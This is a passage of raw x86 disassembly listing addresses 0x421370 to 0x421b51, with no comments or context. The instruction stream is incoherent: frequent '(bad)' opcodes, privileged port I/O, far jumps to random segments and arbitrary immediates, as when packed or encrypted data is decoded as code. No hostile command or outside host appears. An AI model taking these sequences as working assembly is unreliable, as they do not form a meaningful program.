  421370:	mov    WORD PTR fs:[edi],ds
  421373:	nop
  421374:	sub    bl,bl
  421376:	shl    DWORD PTR [esi-0x648e596f],1
  42137c:	inc    ebx
  42137d:	out    dx,al
  42137e:	push   ecx
  42137f:	dec    eax
  421380:	or     ebx,DWORD PTR [ebp+0x5f68a2f0]
  421386:	xchg   esi,eax
  421387:	xchg   esi,eax
  421388:	sub    al,0x9
  42138a:	push   ebx
  42138b:	push   esi
  42138c:	cld    
  42138d:	jo     0x421409
  42138f:	xor    eax,DWORD PTR [edx]
  421391:	je     0x4213fd
  421393:	push   ds
  421394:	(bad)  
  421395:	enter  0xd1ce,0xf1
  421399:	(bad)
  42139c:	and    DWORD PTR [edi+0xa],0x82704335
  4213a3:	cli    
  4213a4:	dec    esi
  4213a5:	xlat   BYTE PTR ds:[ebx]
  4213a6:	jbe    0x4213be
  4213a8:	cdq    
  4213a9:	sub    ecx,DWORD PTR [edx-0x3e]
  4213ac:	ja     0x4213d0
  4213ae:	jae    0x4213d9
  4213b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213b1:	idiv   BYTE PTR [ebx+0xa956460]
  4213b7:	fdivr  DWORD PTR [esi-0x685e3377]
  4213bd:	jo     0x421428
  4213bf:	inc    ebp
  4213c0:	ret    
  4213c1:	clc    
  4213c2:	fimul  WORD PTR [ebp-0x2c4ab119]
  4213c8:	sub    eax,0x45fa5ab1
  4213cd:	test   DWORD PTR [edi-0x28e87fd1],ebx
  4213d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213d4:	ins    DWORD PTR es:[edi],dx
  4213d5:	and    al,ch
  4213d7:	mov    esp,DWORD PTR [ebp+eax*4+0x2b189870]
  4213de:	scas   eax,DWORD PTR es:[edi]
  4213df:	in     eax,dx
  4213e0:	jae    0x4213e3
  4213e2:	jae    0x4213ed
  4213e4:	int3   
  4213e5:	xor    DWORD PTR [ebx+ebx*4-0x12],ebp
  4213e9:	sti    
  4213ea:	(bad)  
  4213ec:	jmp    0xa697:0x27948bdf
  4213f3:	pop    es
  4213f4:	jno    0x4213f6
  4213f6:	jle    0x4213cf
  4213f8:	enter  0xae2a,0xf9
  4213fc:	mov    ebx,0x3d6e39ef
  421401:	nop
  421402:	aaa    
  421403:	adc    al,BYTE PTR [edx-0x4d]
  421406:	mov    esp,0xb14f4511
  42140b:	aas    
  42140c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42140e:	or     esi,DWORD PTR [edx-0x70]
  421411:	inc    esp
  421412:	xchg   DWORD PTR [esi+ecx*4-0x4e],edi
  421416:	es ds popa 
  421419:	or     ah,bl
  42141b:	xchg   BYTE PTR [eax+esi*8-0x640e8092],dl
  421422:	mov    al,al
  421424:	ins    BYTE PTR es:[edi],dx
  421425:	dec    ebx
  421426:	mov    bh,0x7d
  421428:	jno    0x421463
  42142a:	and    BYTE PTR [ecx+0x44afd320],bh
  421430:	pop    esi
  421431:	stos   BYTE PTR es:[edi],al
  421432:	inc    esp
  421433:	cdq    
  421434:	dec    ebp
  421435:	push   es
  421436:	jne    0x421413
  421438:	push   ebx
  421439:	and    al,0x7
  42143b:	xor    BYTE PTR ds:0x59cd73f1,ch
  421441:	scas   eax,DWORD PTR es:[edi]
  421442:	mov    ecx,DWORD PTR [edi+0x54b6e059]
  421448:	cmp    ecx,DWORD PTR fs:[edx+esi*1+0x3374fac3]
  421450:	mov    eax,ds:0x97b6898
  421455:	rcl    DWORD PTR [ebx],0x71
  421458:	sbb    eax,0xec2d4a94
  42145d:	mov    ds:0xa1d52d5d,eax
  421462:	inc    ecx
  421463:	gs pop esi
  421465:	psadbw mm6,mm6
  421468:	push   0x7f
  42146a:	jnp    0x4214e7
  42146c:	cdq    
  42146d:	push   esp
  42146e:	jne    0x421494
  421470:	pop    ss
  421471:	(bad)  
  421472:	and    ebx,ebp
  421474:	call   0xa498:0xb7f597aa
  42147b:	pop    esp
  42147c:	sbb    ah,BYTE PTR [edx-0x52]
  42147f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421480:	xchg   ecx,eax
  421481:	addr16 xor al,0xba
  421484:	loope  0x421412
  421486:	mov    esp,0xfd2d4cd4
  42148b:	pop    ebx
  42148c:	repz shl DWORD PTR [esi-0x6d],0xac
  421491:	dec    edi
  421492:	cmp    cl,BYTE PTR [edx]
  421494:	adc    esi,DWORD PTR [eax-0x2d]
  421497:	scas   al,BYTE PTR es:[edi]
  421498:	pusha  
  421499:	jmp    0x42890be9
  42149e:	pushf  
  42149f:	iret   
  4214a0:	in     al,dx
  4214a1:	dec    ebp
  4214a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214a3:	xchg   BYTE PTR [ecx-0x9],al
  4214a6:	daa    
  4214a7:	and    eax,0xe7939df6
  4214ac:	int3   
  4214ad:	jmp    0x9ce0:0xcf15e337
  4214b4:	xor    DWORD PTR [edi],esp
  4214b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214b7:	ja     0x42146f
  4214b9:	mov    al,ds:0x9be35bed
  4214be:	mov    ah,0x1f
  4214c0:	gs cli 
  4214c2:	xor    al,0xa1
  4214c4:	out    dx,al
  4214c5:	mov    esi,0xb606098d
  4214ca:	ret    0xacf7
  4214cd:	xchg   esp,eax
  4214ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214cf:	pop    ds
  4214d0:	push   ecx
  4214d1:	and    BYTE PTR [edi],dh
  4214d3:	(bad)  
  4214d4:	push   ds
  4214d5:	outs   dx,DWORD PTR ds:[esi]
  4214d6:	xchg   si,ax
  4214d8:	popa   
  4214d9:	xchg   ebp,eax
  4214da:	cld    
  4214db:	dec    eax
  4214dc:	enter  0x122b,0xd7
  4214e0:	mov    esi,0x7eecc621
  4214e5:	add    al,0xc3
  4214e7:	push   edx
  4214e8:	cmp    al,0x43
  4214ea:	mov    eax,ecx
  4214ec:	fsubr  st(5),st
  4214ee:	jmp    0x7838:0xcf5d40c6
  4214f5:	or     esp,ebp
  4214f7:	add    dh,BYTE PTR [edi]
  4214f9:	mov    BYTE PTR [eax],bl
  4214fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214fd:	jp     0x421491
  4214ff:	int    0x9d
  421501:	jecxz  0x4214b5
  421503:	popa   
  421504:	enter  0xb418,0xe
  421508:	sahf   
  421509:	xchg   esp,eax
  42150a:	sbb    BYTE PTR [edx],al
  42150c:	iret   
  42150d:	or     DWORD PTR [esi-0x65],ebp
  421510:	sbb    eax,0x97480224
  421515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421516:	loop   0x421578
  421518:	les    ebx,FWORD PTR [ecx-0x7f]
  42151b:	stc    
  42151c:	mov    ecx,0x4975e893
  421521:	add    esi,DWORD PTR [eax+0x791de0ee]
  421527:	jnp    0x421529
  421529:	jb     0x4214ff
  42152b:	fwait
  42152c:	lds    edx,FWORD PTR [ebx]
  42152e:	mov    eax,0x26caf27a
  421533:	xchg   edx,eax
  421534:	mov    esi,0x1693843d
  421539:	or     BYTE PTR [esi+0x7f4de578],cl
  42153f:	ja     0x42156f
  421541:	and    ebx,ebp
  421543:	mov    dl,0xf0
  421545:	call   0x472d9fca
  42154a:	retf   
  42154b:	stos   DWORD PTR es:[edi],eax
  42154c:	xor    al,dl
  42154e:	mov    bl,0x7d
  421550:	jl     0x42157b
  421552:	aam    0x76
  421554:	mov    ebx,0x2b5e8295
  421559:	test   BYTE PTR [esi+0x35ddea],bl
  42155f:	aad    0x53
  421561:	dec    edx
  421562:	cwde   
  421563:	aaa    
  421564:	push   ebx
  421565:	xor    al,0x9
  421567:	stc    
  421568:	fs push eax
  42156a:	das    
  42156b:	pop    eax
  42156c:	int    0x5f
  42156e:	jmp    0x396bbb52
  421573:	adc    dl,BYTE PTR [ebp+edi*2-0x4a37cbe5]
  42157a:	jno    0x4215dd
  42157c:	xlat   BYTE PTR ds:[ebx]
  42157d:	repz mov esp,DWORD PTR [esi+0x59577c6]
  421584:	idiv   DWORD PTR [edi+esi*4+0x6267ce1c]
  42158b:	jbe    0x4215d6
  42158d:	mov    ch,0x14
  42158f:	xchg   edx,eax
  421590:	jp     0x421596
  421592:	push   esp
  421593:	jb     0x4215d0
  421595:	xlat   BYTE PTR ds:[ebx]
  421596:	adc    DWORD PTR [edx],esp
  421598:	mov    ch,0x7
  42159a:	sub    ch,0x39
  42159d:	retf   
  42159e:	or     eax,0x251ce062
  4215a3:	outs   dx,BYTE PTR ds:[esi]
  4215a4:	int    0x0
  4215a6:	cmp    al,0xba
  4215a8:	stos   BYTE PTR es:[edi],al
  4215a9:	push   ecx
  4215aa:	and    DWORD PTR [edi],esp
  4215ac:	pop    ecx
  4215ad:	cmp    al,0x2
  4215af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215b0:	sub    al,BYTE PTR [edx-0x6faf2e1]
  4215b6:	hlt    
  4215b7:	(bad)  
  4215b8:	sub    esp,DWORD PTR [edx]
  4215ba:	(bad)  
  4215bb:	push   edi
  4215bc:	sbb    eax,0x7e4efe9b
  4215c1:	xchg   ebp,eax
  4215c2:	push   esi
  4215c3:	es ret 
  4215c5:	pushf  
  4215c6:	xchg   esp,eax
  4215c7:	jae    0x421600
  4215c9:	out    dx,al
  4215ca:	inc    ebp
  4215cb:	xchg   DWORD PTR ds:0x9ddb124a,edx
  4215d1:	rcl    BYTE PTR [eax-0x160127c6],0x68
  4215d8:	pop    es
  4215d9:	jo     0x421596
  4215db:	mov    cl,0x76
  4215dd:	jb     0x42162b
  4215df:	push   0x7ba0dd85
  4215e4:	cmp    BYTE PTR [ebp+0xfc5ea1f],dh
  4215ea:	jae    0x42165b
  4215ec:	cdq    
  4215ed:	rcl    ch,cl
  4215ef:	outs   dx,BYTE PTR ds:[esi]
  4215f0:	xlat   BYTE PTR ds:[ebx]
  4215f1:	xor    ebp,eax
  4215f3:	sbb    al,0xac
  4215f5:	inc    edi
  4215f6:	pop    DWORD PTR [ebx-0x5da63511]
  4215fc:	add    BYTE PTR [eax+0x3b11401e],al
  421602:	addr16 adc eax,0xd0f97dde
  421608:	int3   
  421609:	pusha  
  42160a:	popa   
  42160b:	dec    DWORD PTR [eax+0x18]
  42160e:	rcl    BYTE PTR gs:[ecx+0x5258751],cl
  421615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421617:	dec    edi
  421618:	xchg   esi,eax
  421619:	add    DWORD PTR [ecx+ecx*2-0x4b],0x2d
  42161e:	pusha  
  42161f:	or     BYTE PTR [edi],bl
  421621:	sbb    eax,0xcbcd15e4
  421626:	and    DWORD PTR [edi-0x1c720060],edi
  42162c:	(bad)  
  42162d:	mov    eax,0x53e221bb
  421632:	out    dx,al
  421633:	push   cs
  421634:	push   0x6d672621
  421639:	popf   
  42163a:	sbb    eax,0x809d684f
  42163f:	mov    ecx,0x1020bdaa
  421644:	xor    DWORD PTR [edi-0x2c],ebx
  421647:	push   edi
  421648:	loope  0x421655
  42164a:	rol    DWORD PTR ds:0x18017a42,0x46
  421651:	(bad)  
  421652:	cdq    
  421653:	data16 fsub DWORD PTR ds:0xbec67d2c
  42165a:	xlat   BYTE PTR ds:[ebx]
  42165b:	ss fwait
  42165d:	jge    0x421690
  42165f:	div    edi
  421661:	repz pop edi
  421663:	fisttp QWORD PTR [ecx]
  421665:	dec    esi
  421666:	push   ebp
  421667:	lods   eax,DWORD PTR ds:[esi]
  421668:	mov    edi,0xfc008c8e
  42166d:	call   0x288b0080
  421672:	adc    ch,BYTE PTR [edx-0x65d1655a]
  421678:	pop    edi
  421679:	mov    eax,0xe885e2a
  42167e:	and    DWORD PTR [edi+esi*4],ebp
  421681:	xchg   DWORD PTR [edi+0x7f348274],esi
  421687:	in     eax,0xbd
  421689:	mov    al,ds:0xa0f80062
  42168e:	out    0xa2,eax
  421690:	or     al,0xb1
  421692:	or     eax,0xbafe3d8b
  421697:	call   0x44440c54
  42169c:	cs ds or eax,0x937531d8
  4216a3:	dec    ebx
  4216a4:	adc    al,0xd
  4216a6:	push   ss
  4216a7:	mov    al,0x54
  4216a9:	and    DWORD PTR [ecx+eiz*2+0x7b4874d5],esi
  4216b0:	iret   
  4216b1:	dec    esp
  4216b2:	dec    edi
  4216b3:	jne    0x4216a8
  4216b5:	call   ebp
  4216b7:	(bad)  
  4216b8:	std    
  4216b9:	add    eax,0xf8fe46d5
  4216be:	mov    ecx,0x1dceeb0e
  4216c3:	adc    al,0x91
  4216c5:	fild   WORD PTR [edi+esi*8+0x8]
  4216c9:	push   cs
  4216ca:	popa   
  4216cb:	add    cl,BYTE PTR [edi-0x7d987bfe]
  4216d1:	push   esi
  4216d2:	ret    
  4216d3:	ds dec di
  4216d6:	push   ebp
  4216d7:	out    0x12,eax
  4216d9:	vmread DWORD PTR [ebx],ebx
  4216dc:	in     eax,0xb2
  4216de:	push   ebx
  4216df:	mov    dh,0x56
  4216e1:	push   eax
  4216e2:	icebp  
  4216e3:	inc    edx
  4216e4:	cdq    
  4216e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216e6:	ret    0xe435
  4216e9:	pushf  
  4216ea:	js     0x4216d7
  4216ec:	addr16 test eax,0x3b8234e5
  4216f2:	xchg   edx,eax
  4216f3:	in     al,0xcf
  4216f5:	les    esi,FWORD PTR [eax+0xa]
  4216f8:	js     0x4216c7
  4216fa:	xchg   ecx,eax
  4216fb:	pop    ebx
  4216fc:	mov    ebp,0x8723bf70
  421701:	mov    edi,0x77ac4fb
  421706:	aam    0xca
  421708:	aam    0x93
  42170a:	hlt    
  42170b:	adc    DWORD PTR [eax],esp
  42170d:	cmp    eax,0x97160b88
  421712:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  421714:	bound  esi,QWORD PTR [ecx]
  421716:	sub    BYTE PTR [eax],al
  421718:	sub    al,0x4b
  42171a:	jecxz  0x4216aa
  42171c:	mov    cl,0xe0
  42171e:	retf   0xe606
  421721:	push   eax
  421722:	leave  
  421723:	pop    esp
  421724:	sti    
  421725:	pop    edx
  421726:	idiv   DWORD PTR [ebp-0x42]
  421729:	test   DWORD PTR [ebp+0x6bbbc412],esp
  42172f:	add    al,0xfa
  421731:	push   ds
  421732:	inc    ebx
  421733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421734:	dec    eax
  421735:	imul   edx,DWORD PTR [esi],0x1e02075
  42173b:	xor    eax,0xfe6bd0ff
  421740:	jg     0x421769
  421742:	cmc    
  421743:	mov    DWORD PTR [edx+edi*4-0x2f],0x9c4f4461
  42174b:	mov    bh,BYTE PTR [edx-0x50243]
  421751:	ja     0x42179e
  421753:	fisubr WORD PTR [ebx-0xa]
  421756:	out    dx,eax
  421757:	jle    0x421722
  421759:	sub    esi,DWORD PTR [ebp-0x4d]
  42175c:	sbb    DWORD PTR [ebp+0x3f9108aa],ecx
  421762:	jb     0x42173f
  421764:	jp     0x42176f
  421766:	stos   DWORD PTR es:[edi],eax
  421767:	sar    DWORD PTR [ecx+0x24cc1ca0],cl
  42176d:	(bad)  
  42176e:	or     eax,0x2ab9633
  421773:	and    ebp,DWORD PTR [ebp-0x13]
  421776:	push   edi
  421777:	push   0x3f
  421779:	rcr    esp,cl
  42177b:	cdq    
  42177c:	je     0x421747
  42177e:	add    edi,DWORD PTR [ebx-0x56417a56]
  421784:	addr16 pusha 
  421786:	lahf   
  421787:	ret    0x6423
  42178a:	adc    ah,0x9
  42178d:	sar    DWORD PTR [ecx-0x72114e5d],cl
  421793:	sets   dl
  421796:	xchg   DWORD PTR [esp+0x3a],esp
  42179a:	sbb    BYTE PTR [esi-0x1ea6e48c],al
  4217a0:	mov    al,BYTE PTR [esi]
  4217a2:	and    edi,DWORD PTR [ecx+0x17]
  4217a5:	push   0xffffffb2
  4217a7:	dec    ebx
  4217a8:	jecxz  0x4217f7
  4217aa:	daa    
  4217ab:	xor    BYTE PTR [esp+ebp*4+0x6af551a5],bh
  4217b2:	lea    eax,cs:[edi+0x17]
  4217b6:	retf   
  4217b7:	fcomp  QWORD PTR [ebx]
  4217b9:	jl     0x421795
  4217bb:	shl    BYTE PTR [edx-0x202c0a4d],cl
  4217c1:	mov    bh,0xf7
  4217c3:	or     al,0xf5
  4217c5:	sub    DWORD PTR [edi+0x3ecc5afe],ebp
  4217cb:	(bad)  
  4217cc:	cmp    al,cl
  4217ce:	lock push ss
  4217d0:	jmp    0xcbefe1cc
  4217d5:	xchg   esp,eax
  4217d6:	jb     0x42184c
  4217d8:	dec    ebx
  4217d9:	and    edx,DWORD PTR [eax]
  4217db:	aaa    
  4217dc:	and    DWORD PTR [eax+0x195c4bb1],eax
  4217e2:	sub    ebp,ecx
  4217e4:	std    
  4217e5:	arpl   WORD PTR [ebx],bx
  4217e7:	jle    0x4217c7
  4217e9:	xchg   edx,eax
  4217ea:	pop    esp
  4217eb:	mov    WORD PTR [edi-0x69],gs
  4217ee:	pop    ecx
  4217ef:	imul   esp,DWORD PTR [eax],0x2abed6ac
  4217f5:	jns    0x421865
  4217f7:	sbb    al,0x77
  4217f9:	or     ebx,DWORD PTR [esi+esi*1-0x27]
  4217fd:	(bad)  
  4217fe:	or     ebx,ecx
  421800:	ds jecxz 0x4217cd
  421803:	syscall 
  421805:	inc    esp
  421806:	(bad)  
  421807:	mov    al,ds:0xbb719119
  42180c:	or     DWORD PTR [edx-0x5cbb7fca],ebp
  421812:	pusha  
  421813:	dec    esi
  421814:	adc    al,0x73
  421816:	or     al,0x7
  421818:	mov    ch,BYTE PTR [edx]
  42181a:	pop    ebx
  42181b:	push   ds
  42181c:	js     0x4217aa
  42181e:	shld   DWORD PTR [edi+0x608665],ecx,0x66
  421826:	xchg   ebx,eax
  421827:	(bad)  
  421828:	retf   
  421829:	loopne 0x42180d
  42182b:	cmp    eax,0x1fddef8
  421830:	xor    BYTE PTR [ecx],dh
  421832:	jne    0x421835
  421834:	sub    BYTE PTR [edi+0x19],bl
  421837:	cmp    dl,cl
  421839:	sub    eax,0x8b64d0bb
  42183e:	in     eax,0x9a
  421840:	xchg   ecx,eax
  421841:	push   0xd6b28ce7
  421846:	outs   dx,DWORD PTR ds:[esi]
  421847:	in     al,dx
  421848:	jae    0x4218ae
  42184a:	js     0x421803
  42184c:	adc    edi,0x3ec9d570
  421852:	mov    ebp,0xb0ef3ce7
  421857:	pop    esp
  421858:	sahf   
  421859:	popa   
  42185a:	xchg   esi,eax
  42185b:	popf   
  42185c:	(bad)  [edi-0x12]
  42185f:	jbe    0x4218d5
  421861:	xor    edx,DWORD PTR [ebx+ebp*4+0x76]
  421865:	dec    esp
  421866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421867:	dec    edx
  421868:	jb     0x421862
  42186a:	es pop si
  42186d:	adc    eax,DWORD PTR [esp+ebx*2-0x31]
  421871:	sbb    DWORD PTR [ecx],edi
  421873:	and    ecx,DWORD PTR ds:0x8683b066
  421879:	or     al,bh
  42187b:	adc    bh,ch
  42187d:	loope  0x4218f3
  42187f:	cwde   
  421880:	popa   
  421881:	cmp    DWORD PTR [edi],esp
  421883:	add    DWORD PTR [eiz*2+0x514fa08b],eax
  42188a:	fldenv [edi]
  42188c:	fidiv  WORD PTR [ebx+0x1cb02917]
  421892:	shl    BYTE PTR [edx+ebx*1+0x75],1
  421896:	frstor [edx]
  421898:	jno    0x4218e2
  42189a:	mov    al,0x2a
  42189c:	add    dh,BYTE PTR [ebx+0xb]
  42189f:	es sub ebp,edi
  4218a2:	jne    0x42187d
  4218a4:	out    0xf5,eax
  4218a6:	pop    ebx
  4218a7:	fwait
  4218a8:	stos   BYTE PTR es:[edi],al
  4218a9:	mov    esi,0x790abd45
  4218ae:	js     0x4218a0
  4218b0:	enter  0x870d,0xb1
  4218b4:	lahf   
  4218b5:	mov    esi,0xa889f5b1
  4218ba:	sub    esi,DWORD PTR [esi-0x56]
  4218bd:	push   esp
  4218be:	or     esi,DWORD PTR [edi+0x7f]
  4218c1:	xchg   ebx,eax
  4218c2:	pop    ebx
  4218c3:	mov    ch,dh
  4218c5:	mov    eax,ds:0x26cdf57e
  4218ca:	and    al,0xc8
  4218cc:	xchg   edx,eax
  4218cd:	fs cmp esp,ebx
  4218d0:	lds    ebx,FWORD PTR [ecx+esi*1]
  4218d3:	out    dx,al
  4218d4:	mov    al,ds:0x9cd6222d
  4218d9:	mov    bl,0xd1
  4218db:	retf   
  4218dc:	xchg   esi,eax
  4218dd:	gs inc edi
  4218df:	add    esi,DWORD PTR [ebp-0x7b7a5f60]
  4218e5:	push   edi
  4218e6:	jmp    0x22b5:0xf80f3cb6
  4218ed:	xchg   edx,eax
  4218ee:	(bad)  
  4218ef:	imul   ebx,DWORD PTR [edi-0x3e],0x6f
  4218f3:	scas   eax,DWORD PTR es:[edi]
  4218f4:	(bad)  
  4218f5:	sahf   
  4218f6:	push   0x60f77ec8
  4218fb:	mov    cl,0x59
  4218fd:	test   al,0x75
  4218ff:	out    0xa9,eax
  421901:	sub    ch,BYTE PTR [edi+0x7da9232]
  421907:	test   al,0xb7
  421909:	jg     0x42195b
  42190b:	mov    ecx,0x3218cde
  421910:	xchg   esp,eax
  421911:	mov    ebx,0x350f49cb
  421916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421917:	mov    ebp,0xa3b0d177
  42191c:	hlt    
  42191d:	add    al,0x89
  42191f:	sub    eax,edi
  421921:	push   esi
  421922:	or     BYTE PTR [ebp+0x1b],ah
  421925:	mov    edx,0x31813549
  42192a:	repnz cs (bad) 
  42192d:	and    DWORD PTR [eax-0x1b60d56d],ebx
  421933:	test   BYTE PTR [eax+0x9e7f126],dl
  421939:	jae    0x421967
  42193b:	(bad)  
  42193c:	dec    ebp
  42193d:	add    BYTE PTR [ebp-0x574f842b],dh
  421943:	sub    eax,0x6fa75ae2
  421948:	clc    
  421949:	mov    edx,es
  42194b:	pushf  
  42194c:	sar    DWORD PTR [ebx-0x50],cl
  42194f:	inc    ebp
  421950:	lds    esi,FWORD PTR [esi]
  421952:	ret    
  421953:	xor    al,0x40
  421955:	adc    cl,BYTE PTR [ecx+0x5b]
  421958:	idiv   ecx
  42195a:	pushf  
  42195b:	mov    al,0xe
  42195d:	inc    edx
  42195e:	sbb    dh,BYTE PTR [ecx+0x2bd671c3]
  421964:	pop    esi
  421965:	xor    ecx,ebx
  421967:	push   ebx
  421968:	mov    ds:0xacda9e04,al
  42196d:	cmc    
  42196e:	jae    0x421900
  421970:	jnp    0x4219d6
  421972:	dec    eax
  421973:	jmp    0xa0a5670
  421978:	mov    edx,0x3f558fbc
  42197d:	sti    
  42197e:	repz fmul QWORD PTR [ecx-0x1596b3b9]
  421985:	or     DWORD PTR [ebx+esi*8+0x2832fe9],esi
  42198c:	or     ah,BYTE PTR [ebp+0x6f]
  42198f:	clc    
  421990:	or     bh,BYTE PTR [edx]
  421992:	mov    edx,0x6524bf84
  421997:	iret   
  421998:	xor    eax,0xe2677c2b
  42199d:	repz inc bh
  4219a0:	mov    edx,0x47965dfe
  4219a5:	fwait
  4219a6:	aam    0xca
  4219a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219a9:	adc    BYTE PTR [esi+edi*1-0x185bb3b5],0xdf
  4219b1:	inc    edi
  4219b2:	js     0x4219c5
  4219b4:	cmp    DWORD PTR [ebx-0x69ddeaf4],eax
  4219ba:	retf   0xd2ea
  4219bd:	push   ds
  4219be:	fcomp  QWORD PTR [ebp+0x63d273ad]
  4219c4:	std    
  4219c5:	sub    esp,DWORD PTR [ebx+0xb]
  4219c8:	adc    dl,BYTE PTR [ebx+0x250182aa]
  4219ce:	pushf  
  4219cf:	and    al,0x2f
  4219d1:	xor    eax,0x7a809aaa
  4219d6:	push   esp
  4219d7:	(bad)  
  4219d8:	and    eax,0x43889219
  4219dd:	mov    eax,0x924f331f
  4219e2:	jae    0x421a1e
  4219e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219e5:	ins    DWORD PTR es:[edi],dx
  4219e6:	retf   
  4219e7:	test   BYTE PTR [edi+0x5c95cde1],al
  4219ed:	xchg   esi,eax
  4219ee:	scas   al,BYTE PTR es:[edi]
  4219ef:	es je  0x421995
  4219f2:	repnz lahf 
  4219f4:	push   0x1c
  4219f6:	ret    
  4219f7:	popf   
  4219f8:	sbb    BYTE PTR [esi],cl
  4219fa:	jnp    0x421a02
  4219fc:	jno    0x42198d
  4219fe:	xchg   ebx,eax
  4219ff:	int3   
  421a00:	sub    BYTE PTR [eax+0x7b],ah
  421a03:	mov    bl,0xa1
  421a05:	pcmpgtd mm0,QWORD PTR [esi]
  421a08:	bound  eax,QWORD PTR [eax+0x66559ec]
  421a0e:	jbe    0x4219a8
  421a10:	pop    edx
  421a11:	adc    eax,0x180f5f64
  421a16:	xchg   esp,eax
  421a17:	fdiv   DWORD PTR [edx-0x50]
  421a1a:	inc    edi
  421a1b:	into   
  421a1c:	mov    edx,DWORD PTR [ebx+0xfaf1c4e]
  421a22:	aas    
  421a23:	leave  
  421a24:	inc    esi
  421a25:	cmp    ah,bh
  421a27:	fsub   QWORD PTR [edi+0x2f]
  421a2a:	push   edx
  421a2b:	sub    ecx,DWORD PTR [edi]
  421a2d:	mov    ebp,0xe97877e8
  421a32:	dec    eax
  421a33:	xor    BYTE PTR [eax-0x14ba8ace],bl
  421a39:	cwde   
  421a3a:	cwde   
  421a3b:	mov    ecx,0x3e70dd72
  421a40:	add    edx,DWORD PTR [edi-0x24]
  421a43:	in     al,dx
  421a44:	sbb    al,0x80
  421a46:	popa   
  421a47:	lods   al,BYTE PTR ds:[esi]
  421a48:	dec    esp
  421a49:	stos   DWORD PTR es:[edi],eax
  421a4a:	repnz and al,bl
  421a4d:	dec    ebx
  421a4e:	clc    
  421a4f:	mov    ebp,0xeb478cad
  421a54:	ss push ebx
  421a56:	and    DWORD PTR [esi+0x30eb7e2e],0x4b55725e
  421a60:	add    ah,BYTE PTR [esi+0x54]
  421a63:	mov    BYTE PTR [ecx-0x2e],ch
  421a66:	or     al,0xef
  421a68:	cmp    al,0x92
  421a6a:	xchg   DWORD PTR [esi+0x18e08da2],edi
  421a70:	mov    bh,0x93
  421a72:	xchg   BYTE PTR [eax],bh
  421a74:	ror    esi,0x32
  421a77:	push   0x18
  421a79:	dec    esi
  421a7a:	je     0x421afa
  421a7c:	pop    edx
  421a7d:	les    ebp,FWORD PTR [esi]
  421a7f:	test   BYTE PTR [edx+0x1b],0x94
  421a83:	dec    esp
  421a84:	mov    edi,0x13c94f99
  421a89:	xor    dl,BYTE PTR [edx+0x7d89bf43]
  421a8f:	loop   0x421a3b
  421a91:	into   
  421a92:	xchg   ebp,eax
  421a93:	xor    DWORD PTR [eax],ecx
  421a95:	dec    esi
  421a96:	mov    BYTE PTR [edx+eiz*2+0xa],ch
  421a9a:	push   ds
  421a9b:	and    al,0x68
  421a9d:	push   cs
  421a9e:	je     0x421abe
  421aa0:	sbb    DWORD PTR [ebx+0x1a43cc0b],ebx
  421aa6:	adc    bh,0x94
  421aa9:	dec    eax
  421aaa:	shr    al,cl
  421aac:	nop
  421aad:	outs   dx,BYTE PTR ds:[esi]
  421aae:	xchg   ebx,eax
  421aaf:	jmp    DWORD PTR [esi+esi*4+0x3bd01b26]
  421ab6:	out    dx,eax
  421ab7:	dec    ebp
  421ab8:	retf   
  421ab9:	in     eax,dx
  421aba:	mov    ah,0x4c
  421abc:	lds    eax,FWORD PTR [edi+0x5b]
  421abf:	inc    edi
  421ac0:	sbb    DWORD PTR ds:0x5bfd502b,esp
  421ac6:	and    al,BYTE PTR [ecx-0x64]
  421ac9:	clc    
  421aca:	call   0x9a90:0x5d24c3a9
  421ad1:	inc    eax
  421ad2:	and    ch,BYTE PTR [ebx-0x8]
  421ad5:	call   0xe6ae699d
  421ada:	jle    0x421aa9
  421adc:	enter  0x8210,0x70
  421ae0:	xchg   BYTE PTR [edi-0x7f2709be],bh
  421ae6:	fstp   QWORD PTR [ecx+0xa]
  421ae9:	dec    ebx
  421aea:	test   BYTE PTR [edi],dl
  421aec:	push   ebp
  421aed:	xchg   ebp,eax
  421aee:	pushf  
  421aef:	xchg   esi,eax
  421af0:	mov    edx,0xc8f58bb1
  421af5:	sub    DWORD PTR [ebx],edx
  421af7:	es fs icebp 
  421afa:	sub    eax,ecx
  421afc:	out    0x7c,al
  421afe:	ss mov edi,0xd80c9f6b
  421b04:	js     0x421aac
  421b06:	leave  
  421b07:	pop    edx
  421b08:	das    
  421b09:	jp     0x421ab9
  421b0b:	pop    ebp
  421b0c:	inc    ebx
  421b0d:	jbe    0x421b77
  421b0f:	add    edi,ecx
  421b11:	retf   
  421b12:	inc    esi
  421b13:	out    0xc9,al
  421b15:	adc    ebx,esp
  421b17:	cmp    eax,0xa7cfaf78
  421b1c:	rcr    BYTE PTR [ecx-0x58a59408],cl
  421b22:	pop    ebp
  421b23:	inc    BYTE PTR [edi+ecx*2+0x67]
  421b27:	pop    edi
  421b28:	pop    edx
  421b29:	xlat   BYTE PTR ds:[ebx]
  421b2a:	out    dx,al
  421b2b:	push   eax
  421b2c:	out    0x3f,al
  421b2e:	repnz scas al,BYTE PTR es:[edi]
  421b30:	jbe    0x421af6
  421b32:	mov    cl,BYTE PTR [edi+0x1e06ed16]
  421b38:	jns    0x421b28
  421b3a:	mov    eax,ds:0xb3a7c8df
  421b3f:	xchg   ecx,eax
  421b40:	mov    WORD PTR [esi+0x43c8c222],es
  421b46:	cld    
  421b47:	mov    ds:0xefc65af0,eax
  421b4c:	mov    ah,0xe6
  421b4e:	xlat   BYTE PTR ds:[ebx]
  421b4f:	jg     0x421b0b
  421b51:	fst    st(5)
